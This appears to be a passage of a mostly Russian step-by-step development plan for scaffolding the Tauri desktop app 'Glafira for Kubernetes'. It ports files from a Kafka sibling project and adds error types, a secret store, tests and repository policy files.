````bash
#!/usr/bin/env bash
# Переносит файл из Glafira for Kafka с зафиксированного коммита (строку о нём в PORTED.md добавляет задача плана).
# Использование: scripts/port.sh <путь в kafka-explorer> <путь здесь>
# Репозиторий Kafka-версии — $KAFKA_REPO (по умолчанию ~/kafka-explorer).
set -euo pipefail
repo="${KAFKA_REPO:-$HOME/kafka-explorer}"
commit=8bbd0bd
src="$1"
dst="$2"
mkdir -p "$(dirname "$dst")"
git -C "$repo" show "$commit:$src" > "$dst"
````

<!-- block: shell t01-port step=1.1 -->
````bash
scripts/port.sh .gitattributes .gitattributes
scripts/port.sh .gitignore .gitignore
scripts/port.sh LICENSE LICENSE
scripts/port.sh index.html index.html
scripts/port.sh pnpm-workspace.yaml pnpm-workspace.yaml
scripts/port.sh public/app-icon.svg public/app-icon.svg
scripts/port.sh scripts/check-dist-compat.mjs scripts/check-dist-compat.mjs
scripts/port.sh scripts/check-dist-compat.test.mjs scripts/check-dist-compat.test.mjs
scripts/port.sh src-tauri/.gitignore src-tauri/.gitignore
scripts/port.sh src-tauri/build.rs src-tauri/build.rs
scripts/port.sh src-tauri/capabilities/default.json src-tauri/capabilities/default.json
scripts/port.sh src-tauri/icons/128x128.png src-tauri/icons/128x128.png
scripts/port.sh src-tauri/icons/128x128@2x.png src-tauri/icons/128x128@2x.png
scripts/port.sh src-tauri/icons/32x32.png src-tauri/icons/32x32.png
scripts/port.sh src-tauri/icons/icon.icns src-tauri/icons/icon.icns
scripts/port.sh src-tauri/icons/icon.ico src-tauri/icons/icon.ico
scripts/port.sh src-tauri/icons/icon.png src-tauri/icons/icon.png
scripts/port.sh src/polyfills.test.ts src/polyfills.test.ts
scripts/port.sh src/polyfills.ts src/polyfills.ts
scripts/port.sh src/styles.css src/styles.css
scripts/port.sh src/vite-env.d.ts src/vite-env.d.ts
scripts/port.sh tsconfig.json tsconfig.json
scripts/port.sh tsconfig.node.json tsconfig.node.json
scripts/port.sh vite.config.ts vite.config.ts
scripts/port.sh vitest.config.ts vitest.config.ts
````

<!-- block: patch t01-port-gitignore step=1.1 -->
````diff
diff --git a/.gitignore b/.gitignore
--- a/.gitignore
+++ b/.gitignore
@@ -23,11 +23,6 @@ dist-ssr
 *.sln
 *.sw?
 
-crates/glafira-mcp/target
-dist-e2e
 
 # Экспорты подключений (без паролей, но с адресами реальных кластеров)
-*.glafira-connections.json
-
-# Внутренний обзор лицензирования — не публикуется
-docs/licensing-review-2026-10-19.md
+*.glafira-kubernetes-connections.json
````

<!-- block: patch t01-port-index-html step=1.1 -->
````diff
diff --git a/index.html b/index.html
--- a/index.html
+++ b/index.html
@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <link rel="icon" type="image/svg+xml" href="/app-icon.svg" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Glafira for Apache Kafka</title>
+    <title>Glafira for Kubernetes</title>
   </head>
 
   <body spellcheck="false" autocapitalize="off" autocorrect="off">
````

<!-- block: patch t01-port-scripts-check-dist-compat-mjs step=1.1 -->
````diff
diff --git a/scripts/check-dist-compat.mjs b/scripts/check-dist-compat.mjs
--- a/scripts/check-dist-compat.mjs
+++ b/scripts/check-dist-compat.mjs
@@ -20,7 +20,8 @@ const SYNTAX = [
 const APIS = [
   { name: "Object.hasOwn (Safari 15.4)", re: /\bObject\.hasOwn\(/, polyfill: /defineProperty\([\w$]+,\s*[`"']hasOwn[`"']/ },
   { name: "structuredClone (Safari 15.4)", re: /\bstructuredClone\(/, guard: /typeof structuredClone\b/ },
-  { name: "Array/String.prototype.at (Safari 15.4)", re: /\.at\(/ },
+  // `...at(` — spread перед функцией, которую минификатор назвал `at`, а не метод.
+  { name: "Array/String.prototype.at (Safari 15.4)", re: /(?<!\.\.)\.at\(/ },
   { name: "findLast / findLastIndex (Safari 15.4)", re: /\.findLast(?:Index)?\(/ },
   { name: "toSorted / toReversed / toSpliced (Safari 16)", re: /\.to(?:Sorted|Reversed|Spliced)\(/ },
   { name: "Object.groupBy / Map.groupBy (Safari 17.4)", re: /\b(?:Object|Map)\.groupBy\(/ },
````

<!-- block: patch t01-port-scripts-check-dist-compat-test-mjs step=1.1 -->
````diff
diff --git a/scripts/check-dist-compat.test.mjs b/scripts/check-dist-compat.test.mjs
--- a/scripts/check-dist-compat.test.mjs
+++ b/scripts/check-dist-compat.test.mjs
@@ -24,6 +24,11 @@ test("приватные поля и статические блоки клас
   assert.ok(p.some((s) => /static/.test(s)), p.join("\n"));
 });
 
+test(".at() — ошибка, а spread перед функцией с именем at — нет", () => {
+  assert.equal(checkDist({ "a.js": "x=[1,2].at(-1)" }).length, 1);
+  assert.deepEqual(checkDist({ "a.js": "this.options={...n,...this.options,...at(e)}" }), []);
+});
+
 test("якорь {#id} в тексте главы не считается приватным полем", () => {
   assert.deepEqual(checkDist({ "ch.js": "var e=`## Раздел {#mtls}\\n\\nтекст`;" }), []);
 });
````

Применить: `python3 /tmp/o1a-blocks.py step 1.1`.

- [ ] **Step 2: Тесты.**

<!-- block: file t01-src-tauri-src-product-rs-tests step=1.2 path=src-tauri/src/product.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    #[test]
    fn matches_tauri_conf() {
        let conf: serde_json::Value =
            serde_json::from_str(include_str!("../tauri.conf.json")).unwrap();
        assert_eq!(conf["identifier"], super::IDENTIFIER);
        assert_eq!(conf["productName"], super::PRODUCT_NAME);
        assert_eq!(conf["app"]["windows"][0]["title"], super::PRODUCT_NAME);
        assert_eq!(conf["mainBinaryName"], super::CLIENT_NAME);
    }
}
````

<!-- block: file t01-src-app-test-tsx step=1.2 path=src/App.test.tsx -->
````tsx
import { render, screen } from "@testing-library/react";
import App from "./App";

test("показывает имя продукта", () => {
  render(<App />);
  expect(screen.getByText("Glafira for Kubernetes")).toBeInTheDocument();
});
````

Применить: `python3 /tmp/o1a-blocks.py step 1.2`.

- [ ] **Step 3: Увидеть падение.**

Run: `pnpm vitest run src/App.test.tsx`
Expected: FAIL — нет модулей или компонентов, которые проверяют тесты.

- [ ] **Step 4: Реализация.**

<!-- block: file t01-contributing-md step=1.4 path=CONTRIBUTING.md -->
````markdown
# Contributing

Thank you for your interest in Glafira for Kubernetes.

## Before you start

- Open an issue first for anything bigger than a small fix, so that the approach can be agreed on.
- The working language of the repository is Russian: comments, commit messages and `docs/` are written in Russian.
  Issues and pull requests in English are welcome.

## Building and testing

See `README.md` («Требования», «Запуск», «Тесты»). Before opening a pull request run:

```bash
pnpm test && pnpm test:scripts && pnpm i18n:check && pnpm build
cargo fmt --manifest-path src-tauri/Cargo.toml --check
cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings
cargo test --manifest-path src-tauri/Cargo.toml --lib
cargo deny --manifest-path src-tauri/Cargo.toml --config deny.toml check licenses
```

`cargo-deny` can be installed with `cargo install cargo-deny --locked --version 0.20.2`.

## Interface strings and the guide

Every new string goes to all dictionaries in `src/locales/` at once (see `docs/i18n/README.md` and
`docs/i18n/glossary.md`); `pnpm i18n:check` enforces it. Changes to the user guide go to every language in
`docs/guide/`.

## Shared code with Glafira for Apache Kafka

Files listed in `PORTED.md` were copied from Glafira for Apache Kafka. A fix in such a file is usually needed in
both projects: mention it in the pull request.

## Developer Certificate of Origin

Contributions are accepted under the Apache License 2.0 (`LICENSE`). Commits in pull requests from contributors
must be signed off (`git commit -s`), which certifies the
[Developer Certificate of Origin](https://developercertificate.org/). Pull requests whose commits lack
a `Signed-off-by` line are not merged.
````

<!-- block: file t01-notice step=1.4 path=NOTICE -->
````text
Glafira for Kubernetes
Copyright 2026 Viacheslav Novgorodtsev

This product includes software developed by third parties under their own
licenses; see THIRD_PARTY.md for the list.

Kubernetes is a registered trademark of The Linux Foundation. OpenShift is a
trademark of Red Hat, Inc. Platform V and DropApp are trademarks of their
respective owners. This project is not affiliated with The Linux Foundation,
Red Hat or SberTech.
````

<!-- block: file t01-ported-md step=1.4 path=PORTED.md -->
````markdown
# Перенесено из Glafira for Kafka

Файлы скопированы из `vvnovg/glafira-kafka` (локально `~/kafka-explorer`) скриптом `scripts/port.sh`.
Исправление общей части нужно перенести в другой проект; строка показывает, откуда взят файл.

| Здесь | В kafka-explorer | Коммит | Правки |
|---|---|---|---|
| `pnpm-workspace.yaml` | `pnpm-workspace.yaml` | `8bbd0bd` | как есть |
| `tsconfig.json` | `tsconfig.json` | `8bbd0bd` | как есть |
| `tsconfig.node.json` | `tsconfig.node.json` | `8bbd0bd` | как есть |
| `vite.config.ts` | `vite.config.ts` | `8bbd0bd` | как есть |
| `vitest.config.ts` | `vitest.config.ts` | `8bbd0bd` | как есть |
| `.gitattributes` | `.gitattributes` | `8bbd0bd` | как есть |
| `LICENSE` | `LICENSE` | `8bbd0bd` | как есть |
| `public/app-icon.svg` | `public/app-icon.svg` | `8bbd0bd` | как есть |
| `src/vite-env.d.ts` | `src/vite-env.d.ts` | `8bbd0bd` | как есть |
| `src/polyfills.ts` | `src/polyfills.ts` | `8bbd0bd` | как есть |
| `src/polyfills.test.ts` | `src/polyfills.test.ts` | `8bbd0bd` | как есть |
| `src/styles.css` | `src/styles.css` | `8bbd0bd` | как есть |
| `scripts/check-dist-compat.mjs` | `scripts/check-dist-compat.mjs` | `8bbd0bd` | адаптирован: исправлено ложное срабатывание `...at(` (перенести в Kafka-версию) |
| `scripts/check-dist-compat.test.mjs` | `scripts/check-dist-compat.test.mjs` | `8bbd0bd` | адаптирован: тест `...at(` |
| `src-tauri/build.rs` | `src-tauri/build.rs` | `8bbd0bd` | как есть |
| `src-tauri/capabilities/default.json` | `src-tauri/capabilities/default.json` | `8bbd0bd` | как есть |
| `src-tauri/icons/32x32.png` | `src-tauri/icons/32x32.png` | `8bbd0bd` | как есть |
| `src-tauri/icons/128x128.png` | `src-tauri/icons/128x128.png` | `8bbd0bd` | как есть |
| `src-tauri/icons/128x128@2x.png` | `src-tauri/icons/128x128@2x.png` | `8bbd0bd` | как есть |
| `src-tauri/icons/icon.icns` | `src-tauri/icons/icon.icns` | `8bbd0bd` | как есть |
| `src-tauri/icons/icon.ico` | `src-tauri/icons/icon.ico` | `8bbd0bd` | как есть |
| `src-tauri/icons/icon.png` | `src-tauri/icons/icon.png` | `8bbd0bd` | как есть |
| `index.html` | `index.html` | `8bbd0bd` | адаптирован: заголовок |
| `.gitignore` | `.gitignore` | `8bbd0bd` | адаптирован: без путей Kafka-версии |
| `NOTICE` | `NOTICE` | `8bbd0bd` | адаптирован: имя продукта и товарные знаки |
| `TRADEMARK.md` | `TRADEMARK.md` | `8bbd0bd` | адаптирован: имя продукта и товарные знаки |
| `SECURITY.md` | `SECURITY.md` | `8bbd0bd` | адаптирован: имя продукта и товарные знаки |
| `CONTRIBUTING.md` | `CONTRIBUTING.md` | `8bbd0bd` | адаптирован: имя продукта и товарные знаки |
| `src-tauri/.gitignore` | `src-tauri/.gitignore` | `8bbd0bd` | как есть |
````

<!-- block: file t01-security-md step=1.4 path=SECURITY.md -->
````markdown
# Security policy

## Supported versions

Only the latest release on https://github.com/vvnovg/glafira-kubernetes-releases/releases receives fixes.

## Reporting a vulnerability

Please do not open a public issue. Use GitHub's private vulnerability reporting: on the repository page open
the **Security** tab and click **Report a vulnerability**. Describe the problem, the app version and the steps
to reproduce it.

You will get a reply within 7 days. When a fix is released, the report is published as a security advisory with
credit to the reporter, unless you ask otherwise.

## What matters most

Glafira connects to Kubernetes clusters, OpenShift and Platform V DropApp among them, with the user's credentials
(tokens, client certificates, browser login, exec plugins). Reports about credential handling (system secret store,
logs), the OAuth login flow, exec plugins and the administrator policy are especially welcome.
````

<!-- block: file t01-trademark-md step=1.4 path=TRADEMARK.md -->
````markdown
# Trademarks

"Glafira", "Glafira for Kubernetes" and the Glafira application icon are trademarks of Viacheslav Novgorodtsev.
The Apache License 2.0 that covers the source code does not grant any rights to these names or to the icon
(see section 6 of the license).

You may:

- say that your software works with Glafira or is compatible with it;
- link to this repository and to the official releases;
- use the name when describing or reviewing the application.

You may not, without written permission:

- distribute modified or rebuilt versions of the application under the name Glafira or with the Glafira icon —
  give your fork its own name and icon;
- use the name or the icon in a way that suggests the author endorses your product or service.

Kubernetes is a registered trademark of The Linux Foundation. OpenShift is a trademark of Red Hat, Inc. Platform V
and DropApp are trademarks of their respective owners. This project is not affiliated with The Linux Foundation,
Red Hat or SberTech.
````

<!-- block: file t01-package-json step=1.4 path=package.json -->
````json
{
  "name": "glafira-kubernetes",
  "private": true,
  "version": "0.1.0",
  "license": "Apache-2.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "tsc && vite build && node scripts/check-dist-compat.mjs dist/assets",
    "check:dist": "node scripts/check-dist-compat.mjs dist/assets",
    "preview": "vite preview",
    "tauri": "tauri",
    "test": "vitest run",
    "test:scripts": "node --test \"scripts/*.test.mjs\""
  },
  "dependencies": {
    "@floating-ui/react": "^0.27.20",
    "@tanstack/react-query": "^5.104.2",
    "@tauri-apps/api": "^2",
    "@tauri-apps/plugin-dialog": "^2.8.2",
    "@tauri-apps/plugin-opener": "^2",
    "i18next": "^25.10.10",
    "react": "^19.1.0",
    "react-dom": "^19.1.0",
    "react-i18next": "^15.7.4",
    "react-markdown": "9.1.0",
    "zustand": "^5.0.15"
  },
  "devDependencies": {
    "@tauri-apps/cli": "^2",
    "@testing-library/jest-dom": "^7.0.1",
    "@testing-library/react": "^16.3.3",
    "@testing-library/user-event": "^14.6.8",
    "@types/react": "^19.1.8",
    "@types/react-dom": "^19.1.6",
    "@vitejs/plugin-react": "^6.0.2",
    "jsdom": "^30.1.2",
    "typescript": "~6.0.3",
    "vite": "^8.0.16",
    "vitest": "^3.2.7"
  }
}
````

<!-- block: file t01-src-tauri-cargo-toml step=1.4 path=src-tauri/Cargo.toml -->
````toml
[package]
name = "glafira-kubernetes"
version = "0.1.0"
description = "Glafira for Kubernetes — desktop-клиент для Kubernetes, OpenShift и Platform V DropApp"
authors = ["Glafira for Kubernetes contributors"]
edition = "2024"
license = "Apache-2.0"
repository = "https://github.com/vvnovg/glafira-kubernetes"

[lib]
# Суффикс _lib нужен, чтобы имя библиотеки не совпало с именем бинаря (Windows, cargo#8519).
name = "glafira_kubernetes_lib"
crate-type = ["staticlib", "cdylib", "rlib"]

[build-dependencies]
tauri-build = { version = "2", features = [] }

[dependencies]
tauri = { version = "2", features = [] }
tauri-plugin-opener = "2"
tauri-plugin-dialog = "2"
serde = { version = "1", features = ["derive"] }
serde_json = "1"

[dev-dependencies]
tempfile = "3"

[profile.release]
codegen-units = 1
lto = true
opt-level = 3
panic = "abort"
strip = true
````

<!-- block: file t01-src-tauri-src-lib-rs step=1.4 path=src-tauri/src/lib.rs -->
````rust
pub mod product;

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .run(tauri::generate_context!())
        .expect("error while building tauri application");
}
````

<!-- block: file t01-src-tauri-src-main-rs step=1.4 path=src-tauri/src/main.rs -->
````rust
// Prevents additional console window on Windows in release, DO NOT REMOVE!!
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

fn main() {
    glafira_kubernetes_lib::run()
}
````

<!-- block: file t01-src-tauri-src-product-rs-impl step=1.4 path=src-tauri/src/product.rs part=impl -->
````rust
//! Имя продукта и идентификаторы — в одном месте. Переименование меняет только этот файл
//! и `tauri.conf.json`; тест ниже следит, чтобы они совпадали.

pub const PRODUCT_NAME: &str = "Glafira for Kubernetes";
pub const IDENTIFIER: &str = "io.github.vvnovg.glafira.kubernetes";
pub const KEYCHAIN_SERVICE: &str = "glafira-kubernetes";
pub const POLICY_VENDOR: &str = "Glafira";
pub const POLICY_PRODUCT: &str = "Kubernetes";
/// Имя, под которым Glafira видна в кластере: `User-Agent` запросов и `fieldManager` изменений.
pub const CLIENT_NAME: &str = "glafira-kubernetes";
````

<!-- block: file t01-src-tauri-tauri-conf-json step=1.4 path=src-tauri/tauri.conf.json -->
````json
{
  "$schema": "https://schema.tauri.app/config/2",
  "productName": "Glafira for Kubernetes",
  "mainBinaryName": "glafira-kubernetes",
  "version": "0.1.0",
  "identifier": "io.github.vvnovg.glafira.kubernetes",
  "build": {
    "beforeDevCommand": "pnpm dev",
    "devUrl": "http://localhost:1420",
    "beforeBuildCommand": "pnpm build",
    "frontendDist": "../dist"
  },
  "app": {
    "windows": [
      {
        "title": "Glafira for Kubernetes",
        "width": 1400,
        "height": 900,
        "minWidth": 900,
        "minHeight": 600,
        "dragDropEnabled": false
      }
    ],
    "security": {
      "csp": "default-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src ipc: http://ipc.localhost"
    }
  },
  "bundle": {
    "active": true,
    "targets": ["app", "dmg", "msi", "deb", "rpm", "appimage"],
    "icon": [
      "icons/32x32.png",
      "icons/128x128.png",
      "icons/128x128@2x.png",
      "icons/icon.icns",
      "icons/icon.ico"
    ],
    "publisher": "Glafira for Kubernetes",
    "category": "DeveloperTool",
    "shortDescription": "Glafira for Kubernetes — desktop client for Kubernetes, OpenShift and Platform V DropApp",
    "copyright": "© 2026 Viacheslav Novgorodtsev",
    "linux": {
      "deb": { "depends": ["libsecret-1-0"] },
      "rpm": { "depends": ["libsecret"] }
    },
    "macOS": { "minimumSystemVersion": "11.0" },
    "windows": {
      "wix": {
        "upgradeCode": "c3a3f458-3ec5-4961-909a-d0ee6b19db8a",
        "language": ["en-US"]
      }
    }
  }
}
````

<!-- block: file t01-src-app-tsx step=1.4 path=src/App.tsx -->
````tsx
export default function App() {
  return <main className="page">Glafira for Kubernetes</main>;
}
````

<!-- block: file t01-src-main-tsx step=1.4 path=src/main.tsx -->
````tsx
import "./polyfills";
import React from "react";
import ReactDOM from "react-dom/client";
import App from "./App";
import "./styles.css";

ReactDOM.createRoot(document.getElementById("root") as HTMLElement).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>,
);
````

<!-- block: file t01-src-test-setup-ts step=1.4 path=src/test/setup.ts -->
````ts
import "@testing-library/jest-dom/vitest";
````

<!-- block: shell t01-install step=1.4 -->
````bash
pnpm install
````

Применить: `python3 /tmp/o1a-blocks.py step 1.4`.

- [ ] **Step 5: Проверки.**

Run: `pnpm test`  
Expected: PASS — `Test Files 2 passed`, `Tests 4 passed`

Run: `pnpm test:scripts`  
Expected: PASS — `# pass 9`, `# fail 0`

Run: `pnpm exec tsc --noEmit`  
Expected: PASS — без ошибок

Run: `pnpm build`  
Expected: PASS — `✓ dist/assets: чанки совместимы с WebKit macOS 11+`

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 1 passed; 0 failed`

- [ ] **Step 6: Commit.**

```bash
git add -A
git commit -s -m "chore: каркас Tauri-приложения Glafira for Kubernetes, перенос инструментов из Kafka-версии" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 2: Основа Rust: тексты, ошибки, файлы, секреты, журнал

**Files:**
- Port: `src-tauri/src/dock_name.rs` (с правками), `src-tauri/src/i18n.rs`, `src-tauri/src/logging.rs` (с правками), `src-tauri/src/secrets.rs` (с правками), `src-tauri/src/storage/fs.rs`, `src-tauri/src/sync.rs`
- Create: `src-tauri/src/error.rs`, `src-tauri/src/storage/mod.rs`
- Modify: `PORTED.md`, `src-tauri/Cargo.toml`, `src-tauri/src/lib.rs`

**Interfaces:**
- Produces: `ErrorCode::{ConnectionFailed, TlsError, AuthFailed, SessionExpired, Forbidden, NotFound, Conflict, Timeout, InvalidInput, ReadOnly, ConfirmationRequired, Internal}` (serde `SCREAMING_SNAKE_CASE`); `AppError { code, key, params, message, details, retryable }`, `AppResult<T>`, `AppError::{localized, text, with_details, internal_with}`; `secrets::{SecretStore, KeyringStore, MemoryStore, OverlayStore, TOKEN = "token", CLIENT_KEY = "clientKey", CONNECTION_SECRET_FIELDS, secret_key(id, field) -> "id/field"}`; `storage::fs::{atomic_write, read_json, read_json_or_quarantine, write_json, newer_schema_error}`; `sync::{MutexExt::lock_safe, RwLockExt::{read_safe, write_safe}}`; `logging::init(&Path)`.

Переносятся как есть: `i18n.rs` (`ltext!`, `app_err!`), `sync.rs`, `storage/fs.rs` (атомарная запись, карантин повреждённых файлов), `logging.rs`, `dock_name.rs`. `secrets.rs` получает поля секретов подключения (`token`, `clientKey`). `error.rs` пишется заново без классификации ошибок librdkafka: коды спец. §15 (`SESSION_EXPIRED`, `FORBIDDEN`, `CONFLICT` и др.); повторяемы только `CONNECTION_FAILED` и `TIMEOUT`.

- [ ] **Step 1: Перенос из Kafka-версии.**

Файлы копируются с коммита `8bbd0bd` и правятся патчами (правки — против перенесённого файла).

<!-- block: shell t02-port step=2.1 -->
````bash
scripts/port.sh src-tauri/src/dock_name.rs src-tauri/src/dock_name.rs
scripts/port.sh src-tauri/src/i18n.rs src-tauri/src/i18n.rs
scripts/port.sh src-tauri/src/logging.rs src-tauri/src/logging.rs
scripts/port.sh src-tauri/src/secrets.rs src-tauri/src/secrets.rs
scripts/port.sh src-tauri/src/storage/fs.rs src-tauri/src/storage/fs.rs
scripts/port.sh src-tauri/src/sync.rs src-tauri/src/sync.rs
````

<!-- block: patch t02-port-src-tauri-src-dock-name-rs step=2.1 -->
````diff
diff --git a/src-tauri/src/dock_name.rs b/src-tauri/src/dock_name.rs
--- a/src-tauri/src/dock_name.rs
+++ b/src-tauri/src/dock_name.rs
@@ -1,5 +1,5 @@
 //! Имя приложения в Dock и переключателе ⌘Tab при `tauri dev`. Без бандла `.app`
-//! LaunchServices показывает имя исполняемого файла (`kafka-explorer`), а вшитый Info.plist
+//! LaunchServices показывает имя исполняемого файла (`glafira-kubernetes`), а вшитый Info.plist
 //! с `CFBundleName` не учитывает. Поэтому в debug-сборке имя задаётся вызовом LaunchServices —
 //! так же переименовывает процессы Chromium. В релизе имя берётся из бандла, вызов не нужен.
 
````

<!-- block: patch t02-port-src-tauri-src-logging-rs step=2.1 -->
````diff
diff --git a/src-tauri/src/logging.rs b/src-tauri/src/logging.rs
--- a/src-tauri/src/logging.rs
+++ b/src-tauri/src/logging.rs
@@ -1,5 +1,5 @@
 //! Логи: stderr и файл в папке логов ОС с ротацией по размеру (5 × 5 МБ).
-//! Секреты в логи не пишутся нигде в коде; it_log_redaction.rs это проверяет.
+//! Секреты в логи не пишутся нигде в коде.
 
 use std::fs::{File, OpenOptions};
 use std::io::{self, Write};
````

<!-- block: patch t02-port-src-tauri-src-secrets-rs step=2.1 -->
````diff
diff --git a/src-tauri/src/secrets.rs b/src-tauri/src/secrets.rs
--- a/src-tauri/src/secrets.rs
+++ b/src-tauri/src/secrets.rs
@@ -2,9 +2,6 @@ use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 
 use crate::error::{AppError, AppResult, ErrorCode};
-use crate::kafka::config::{
-    SASL_PASSWORD, SSL_KEY_PASSWORD, SSL_KEYSTORE_PASSWORD, SSL_TRUSTSTORE_PASSWORD,
-};
 use crate::sync::MutexExt;
 
 pub trait SecretStore: Send + Sync {
@@ -13,13 +10,13 @@ pub trait SecretStore: Send + Sync {
     fn delete(&self, key: &str) -> AppResult<()>;
 }
 
-/// Все секреты подключения в keychain (для удаления и миграции).
-pub const CONNECTION_SECRET_FIELDS: [&str; 4] = [
-    SASL_PASSWORD,
-    SSL_KEY_PASSWORD,
-    SSL_KEYSTORE_PASSWORD,
-    SSL_TRUSTSTORE_PASSWORD,
-];
+/// Bearer-токен подключения: вставленный вручную, полученный входом через браузер или из kubeconfig.
+pub const TOKEN: &str = "token";
+/// Ключ клиентского сертификата (PEM).
+pub const CLIENT_KEY: &str = "clientKey";
+
+/// Все секреты подключения в keychain (для удаления).
+pub const CONNECTION_SECRET_FIELDS: [&str; 2] = [TOKEN, CLIENT_KEY];
 
 pub fn secret_key(connection_id: &str, field: &str) -> String {
     format!("{connection_id}/{field}")
@@ -146,7 +143,8 @@ mod tests {
 
     #[test]
     fn key_format() {
-        assert_eq!(secret_key("c1", "sasl.password"), "c1/sasl.password");
+        assert_eq!(secret_key("c1", TOKEN), "c1/token");
+        assert_eq!(secret_key("c1", CLIENT_KEY), "c1/clientKey");
     }
 
     #[test]
````

Применить: `python3 /tmp/o1a-blocks.py step 2.1`.

- [ ] **Step 2: Тесты.**

<!-- block: file t02-src-tauri-src-error-rs-tests step=2.2 path=src-tauri/src/error.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn serializes_for_frontend() {
        let json = serde_json::to_value(app_err!(
            ErrorCode::InvalidInput,
            "errors.connections.emptyName",
            "Connection name cannot be empty"
        ))
        .unwrap();
        assert_eq!(
            json,
            serde_json::json!({
                "code": "INVALID_INPUT",
                "key": "errors.connections.emptyName",
                "message": "Connection name cannot be empty",
                "retryable": false
            })
        );
        let json = serde_json::to_value(AppError::internal_with("boom")).unwrap();
        assert_eq!(
            json,
            serde_json::json!({
                "code": "INTERNAL",
                "key": "errors.internal",
                "message": "Internal error",
                "details": "boom",
                "retryable": false
            })
        );
    }

    #[test]
    fn codes_serialize_and_only_network_ones_are_retryable() {
        for (code, name, retryable) in [
            (ErrorCode::ConnectionFailed, "CONNECTION_FAILED", true),
            (ErrorCode::TlsError, "TLS_ERROR", false),
            (ErrorCode::AuthFailed, "AUTH_FAILED", false),
            (ErrorCode::SessionExpired, "SESSION_EXPIRED", false),
            (ErrorCode::Forbidden, "FORBIDDEN", false),
            (ErrorCode::NotFound, "NOT_FOUND", false),
            (ErrorCode::Conflict, "CONFLICT", false),
            (ErrorCode::Timeout, "TIMEOUT", true),
            (ErrorCode::InvalidInput, "INVALID_INPUT", false),
            (ErrorCode::ReadOnly, "READ_ONLY", false),
            (
                ErrorCode::ConfirmationRequired,
                "CONFIRMATION_REQUIRED",
                false,
            ),
            (ErrorCode::Internal, "INTERNAL", false),
        ] {
            assert_eq!(serde_json::to_value(code).unwrap(), name);
            assert_eq!(
                AppError::localized(code, LocalizedText::raw("x")).retryable,
                retryable,
                "{name}"
            );
        }
    }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 2.2`.

- [ ] **Step 3: Реализация.**

<!-- block: file t02-src-tauri-src-error-rs-impl step=2.3 path=src-tauri/src/error.rs part=impl -->
````rust
use std::collections::BTreeMap;

use serde::Serialize;

use crate::i18n::LocalizedText;

/// Коды ошибок (спец. §15). Фронтенд выбирает поведение по коду, текст — по `key`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
pub enum ErrorCode {
    ConnectionFailed,
    TlsError,
    AuthFailed,
    SessionExpired,
    Forbidden,
    NotFound,
    Conflict,
    Timeout,
    InvalidInput,
    ReadOnly,
    ConfirmationRequired,
    Internal,
}

#[derive(Debug, Clone, Serialize, thiserror::Error)]
#[serde(rename_all = "camelCase")]
#[error("{message}")]
pub struct AppError {
    pub code: ErrorCode,
    /// Ключ словаря интерфейса (`src/locales/*.json`).
    pub key: String,
    #[serde(skip_serializing_if = "BTreeMap::is_empty")]
    pub params: BTreeMap<String, String>,
    /// Английский текст (для логов и как запасной вариант перевода).
    pub message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub details: Option<String>,
    pub retryable: bool,
}

pub type AppResult<T> = Result<T, AppError>;

impl AppError {
    pub fn localized(code: ErrorCode, text: crate::i18n::LocalizedText) -> Self {
        Self {
            code,
            key: text.key,
            params: text.params,
            message: text.text,
            details: None,
            retryable: Self::retryable_code(code),
        }
    }

    fn retryable_code(code: ErrorCode) -> bool {
        matches!(code, ErrorCode::ConnectionFailed | ErrorCode::Timeout)
    }

    /// Текст ошибки для полей-сообщений (ключ, параметры, английский текст).
    pub fn text(&self) -> LocalizedText {
        LocalizedText {
            key: self.key.clone(),
            params: self.params.clone(),
            text: self.message.clone(),
        }
    }

    pub fn with_details(mut self, details: impl Into<String>) -> Self {
        self.details = Some(details.into());
        self
    }

    /// Неожиданная внутренняя ошибка: общий текст «Internal error», подробности — в `details`
    /// (технический текст, не переводится).
    pub fn internal_with(details: impl Into<String>) -> Self {
        app_err!(ErrorCode::Internal, "errors.internal", "Internal error").with_details(details)
    }
}

impl From<std::io::Error> for AppError {
    fn from(e: std::io::Error) -> Self {
        app_err!(
            ErrorCode::Internal,
            "errors.io",
            "I/O error: {{error}}",
            error = e
        )
    }
}

impl From<serde_json::Error> for AppError {
    fn from(e: serde_json::Error) -> Self {
        app_err!(
            ErrorCode::Internal,
            "errors.json",
            "JSON error: {{error}}",
            error = e
        )
    }
}
````

<!-- block: file t02-src-tauri-src-storage-mod-rs step=2.3 path=src-tauri/src/storage/mod.rs -->
````rust
pub mod fs;
````

<!-- block: patch t02-src step=2.3 -->
````diff
diff --git a/PORTED.md b/PORTED.md
--- a/PORTED.md
+++ b/PORTED.md
@@ -34,3 +34,10 @@
 | `SECURITY.md` | `SECURITY.md` | `8bbd0bd` | адаптирован: имя продукта и товарные знаки |
 | `CONTRIBUTING.md` | `CONTRIBUTING.md` | `8bbd0bd` | адаптирован: имя продукта и товарные знаки |
 | `src-tauri/.gitignore` | `src-tauri/.gitignore` | `8bbd0bd` | как есть |
+| `src-tauri/src/i18n.rs` | `src-tauri/src/i18n.rs` | `8bbd0bd` | как есть |
+| `src-tauri/src/sync.rs` | `src-tauri/src/sync.rs` | `8bbd0bd` | как есть |
+| `src-tauri/src/storage/fs.rs` | `src-tauri/src/storage/fs.rs` | `8bbd0bd` | как есть |
+| `src-tauri/src/logging.rs` | `src-tauri/src/logging.rs` | `8bbd0bd` | адаптирован: комментарий |
+| `src-tauri/src/dock_name.rs` | `src-tauri/src/dock_name.rs` | `8bbd0bd` | адаптирован: комментарий |
